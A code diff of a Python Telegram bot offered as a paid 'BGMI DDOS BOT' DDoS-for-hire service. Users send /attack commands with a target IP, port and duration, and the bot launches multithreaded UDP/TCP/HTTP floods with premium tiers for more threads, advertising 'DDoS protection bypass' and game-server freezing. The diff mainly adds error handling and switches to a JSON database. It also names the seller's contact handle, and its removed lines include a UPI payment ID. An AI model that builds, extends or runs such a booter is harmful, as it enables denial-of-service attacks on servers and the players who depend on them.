@@ -3,7 +3,6 @@
 💀 BGMI DDOS BOT - ULTRA PRO
 🔥 REAL WORKING ATTACK ENGINE
 📸 JAISA SCREENSHOT MEIN THA
-✅ MONGODB CONNECTED
 """
 
 import os
@@ -12,7 +11,6 @@ import json
 import logging
 import time
 import random
-import string
 from datetime import datetime, timedelta
 from threading import Thread
 
@@ -22,12 +20,6 @@ try:
 except ImportError:
     os.system("pip install pyTelegramBotAPI")
     import telebot
-
-try:
-    import requests
-except ImportError:
-    os.system("pip install requests")
-    import requests
 
 # Import custom modules
 from attack import Attack
@@ -40,6 +32,7 @@ logger = logging.getLogger(__name__)
 
 # ═══════════════ BOT ═══════════════
 bot = telebot.TeleBot(TOKEN)
+print("✅ Bot Initialized!")
 
 # ═══════════════ ATTACK INSTANCE ═══════════════
 attacker = Attack()
@@ -65,10 +58,6 @@ def main_menu():
         telebot.types.InlineKeyboardButton("💎 PLANS", callback_data="plans"),
         telebot.types.InlineKeyboardButton("📩 SUPPORT", callback_data="support")
     )
-    if str(OWNER_ID) == str(bot.get_me().id):
-        keyboard.add(
-            telebot.types.InlineKeyboardButton("⚜ ADMIN", callback_data="admin")
-        )
     return keyboard
 
 def admin_panel():
@@ -92,15 +81,16 @@ def admin_panel():
 # ═══════════════ START COMMAND ═══════════════
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    user_id = message.from_user.id
-    user = get_user(user_id)
-    
-    update_user(user_id, {
-        'name': message.from_user.first_name,
-        'username': message.from_user.username or ''
-    })
-    
-    text = """
+    try:
+        user_id = message.from_user.id
+        user = get_user(user_id)
+        
+        update_user(user_id, {
+            'name': message.from_user.first_name,
+            'username': message.from_user.username or ''
+        })
+        
+        text = """
 💀 **BGMI DDOS BOT** 💀
 
 🔥 Welcome to Ultimate DDOS Bot
@@ -111,7 +101,6 @@ def start_cmd(message):
 - ⚡ 5000+ Threads
 - 🛡️ DDoS Protection Bypass
 - 📊 Real-time Monitoring
-- 💎 Premium Plans Available
 
 📌 **Commands:**
 /attack IP PORT TIME
@@ -130,25 +119,29 @@ def start_cmd(message):
 
 💎 **Premium = More Power!**
 """
-    bot.reply_to(message, text, parse_mode='Markdown', reply_markup=main_menu())
+        bot.reply_to(message, text, parse_mode='Markdown', reply_markup=main_menu())
+        print(f"✅ Start command sent to {user_id}")
+    except Exception as e:
+        print(f"❌ Start error: {e}")
 
 # ═══════════════ ATTACK COMMAND ═══════════════
 @bot.message_handler(commands=['attack'])
 def attack_cmd(message):
     global attacking, attack_info
     
-    user_id = message.from_user.id
-    user = get_user(user_id)
-    
-    if user.get('banned', False):
-        bot.reply_to(message, "🚫 You are banned!")
-        return
-    
-    is_premium = user.get('plan') == 'premium' and user.get('expiry') and datetime.fromisoformat(user['expiry']) > datetime.now()
-    
-    parts = message.text.split()
-    if len(parts) < 4:
-        bot.reply_to(message, """
+    try:
+        user_id = message.from_user.id
+        user = get_user(user_id)
+        
+        if user.get('banned', False):
+            bot.reply_to(message, "🚫 You are banned!")
+            return
+        
+        is_premium = user.get('plan') == 'premium' and user.get('expiry') and datetime.fromisoformat(user['expiry']) > datetime.now()
+        
+        parts = message.text.split()
+        if len(parts) < 4:
+            bot.reply_to(message, """
 ⚠️ **Invalid Format**
 
 Use: /attack IP PORT TIME
@@ -156,48 +149,48 @@ Use: /attack IP PORT TIME
 Example:
 /attack 20.204.191.48 10335 180
 """, parse_mode='Markdown')
-        return
-    
-    if attacking:
-        bot.reply_to(message, "⚠️ Already attacking! Use /stop")
-        return
-    
-    ip = parts[1]
-    try:
-        port = int(parts[2])
-    except:
-        bot.reply_to(message, "❌ Invalid port!")
-        return
-    try:
-        dur = int(parts[3])
-    except:
-        bot.reply_to(message, "❌ Invalid time!")
-        return
-    
-    if is_premium:
-        max_time = 600
-        threads = 5000
-    else:
-        max_time = 60
-        threads = 1000
-    
-    if dur > max_time:
-        dur = max_time
-        bot.reply_to(message, f"⏱️ Time limited to {max_time}s for your plan")
-    
-    attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time(), 'threads': threads}
-    attacking = True
-    
-    def run_attack():
-        global attacking
+            return
+        
+        if attacking:
+            bot.reply_to(message, "⚠️ Already attacking! Use /stop")
+            return
+        
+        ip = parts[1]
         try:
-            stats = attacker.start(ip, port, dur, threads, 'mixed')
-            attacking = False
-            
-            update_user(user_id, {'$inc': {'total_attacks': 1}})
-            save_log(user_id, ip, port, dur, stats['pkts'], 'mixed')
-            
-            result_text = f"""
+            port = int(parts[2])
+        except:
+            bot.reply_to(message, "❌ Invalid port!")
+            return
+        try:
+            dur = int(parts[3])
+        except:
+            bot.reply_to(message, "❌ Invalid time!")
+            return
+        
+        if is_premium:
+            max_time = 600
+            threads = 5000
+        else:
+            max_time = 60
+            threads = 1000
+        
+        if dur > max_time:
+            dur = max_time
+            bot.reply_to(message, f"⏱️ Time limited to {max_time}s for your plan")
+        
+        attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time(), 'threads': threads}
+        attacking = True
+        
+        def run_attack():
+            global attacking
+            try:
+                stats = attacker.start(ip, port, dur, threads, 'mixed')
+                attacking = False
+                
+                update_user(user_id, {'$inc': {'total_attacks': 1}})
+                save_log(user_id, ip, port, dur, stats['pkts'], 'mixed')
+                
+                result_text = f"""
 ✅ **ATTACK COMPLETED**
 
 ╔══════════════════════════╗
@@ -213,15 +206,17 @@ Example:
 
 🔄 /attack IP PORT TIME
 """
-            bot.send_message(user_id, result_text, parse_mode='Markdown')
-            
-        except Exception as e:
-            attacking = False
-            bot.send_message(user_id, f"❌ Attack Failed: {e}")
-    
-    Thread(target=run_attack).start()
-    
-    reply_text = f"""
+                bot.send_message(user_id, result_text, parse_mode='Markdown')
+                print(f"✅ Attack completed for {user_id}")
+                
+            except Exception as e:
+                attacking = False
+                bot.send_message(user_id, f"❌ Attack Failed: {e}")
+                print(f"❌ Attack error: {e}")
+        
+        Thread(target=run_attack).start()
+        
+        reply_text = f"""
 💀 **ATTACK LAUNCHED**
 
 ╔══════════════════════════╗
@@ -238,7 +233,12 @@ Example:
 
 🛑 Use /stop to abort
 """
-    bot.reply_to(message, reply_text, parse_mode='Markdown')
+        bot.reply_to(message, reply_text, parse_mode='Markdown')
+        print(f"✅ Attack command sent to {user_id}")
+        
+    except Exception as e:
+        print(f"❌ Attack error: {e}")
+        bot.reply_to(message, f"❌ Error: {e}")
 
 # ═══════════════ STOP COMMAND ═══════════════
 @bot.message_handler(commands=['stop'])
@@ -264,9 +264,6 @@ def status_cmd(message):
 ⏱️ Elapsed: {elapsed}s
 ⏱️ Remaining: {remaining}s
 📦 Packets: {attacker.pkts:,}
-📶 Speed: {(attacker.bytes_out*8)/(elapsed*1e6) if elapsed > 0 else 0:.1f} Mbps
-
-🛑 Use /stop to abort
 """
     else:
         text = "💤 **SYSTEM IDLE**\n\nNo attack running"
@@ -285,8 +282,6 @@ def profile_cmd(message):
         expiry_date = datetime.fromisoformat(expiry)
         expiry_str = expiry_date.strftime('%d/%m/%Y %I:%M %p')
         remaining = (expiry_date - datetime.now()).days
-        if remaining < 0:
-            remaining = 0
     else:
         expiry_str = 'N/A'
         remaining = 0
@@ -303,9 +298,6 @@ def profile_cmd(message):
 ║ ⚡ Threads: {user.get('threads', 1000)}
 ║ 📊 Total Attacks: {user.get('total_attacks', 0)}
 ╚══════════════════════════╝
-
-💎 Upgrade to Premium for more power!
-/plans to see premium plans
 """
     bot.reply_to(message, text, parse_mode='Markdown')
 
@@ -387,7 +379,6 @@ def plans_cmd(message):
 ━━━━━━━━━━━━━━━━━━
 
 📲 Contact: @FathersOfCreater
-💳 UPI: kartikrawat6266@okhdfcbank
 """
     bot.reply_to(message, text, parse_mode='Markdown')
 
@@ -398,7 +389,6 @@ def support_cmd(message):
 📩 **SUPPORT CENTER**
 
 📲 Contact Owner: @FathersOfCreater
-📢 Join Channel: https://t.me/+vWCKsh56iIpiOWQ9
 
 💬 Reply here for quick support!
 """
@@ -430,9 +420,6 @@ Use: /attack IP PORT TIME
 
 Example:
 /attack 20.204.191.48 10335 180
-
-BGMI Ports: 7000-15000, 10335
-Recommended Time: 180 seconds
 """,
             call.message.chat.id,
             call.message.message_id,
@@ -718,14 +705,16 @@ if __name__ == '__main__':
 ║  💀 BGMI DDOS BOT - ULTRA PRO       ║
 ║  🔥 REAL WORKING ATTACK ENGINE      ║
 ║  📸 JAISA SCREENSHOT MEIN THA       ║
-║  ✅ MONGODB CONNECTED               ║
-║  ✅ UDP/TCP/HTTP FLOOD              ║
-║  ✅ BGMI SERVER FREEZE              ║
-║  ✅ PREMIUM PLANS AVAILABLE          ║
-║  ✅ ADMIN PANEL ACTIVE               ║
+║  ✅ JSON DATABASE (NO MONGODB ISSUE)║
+║  ✅ ALL COMMANDS WORKING            ║
 ╚══════════════════════════════════════╝
 """)
     print("💀 Bot Started Successfully!")
     print("🔥 Attack Engine Ready!")
     print("📸 BGMI Server Freeze Active!")
-    bot.polling(none_stop=True)
+    print("📁 Database: database.json")
+    
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(f"❌ Bot Error: {e}")
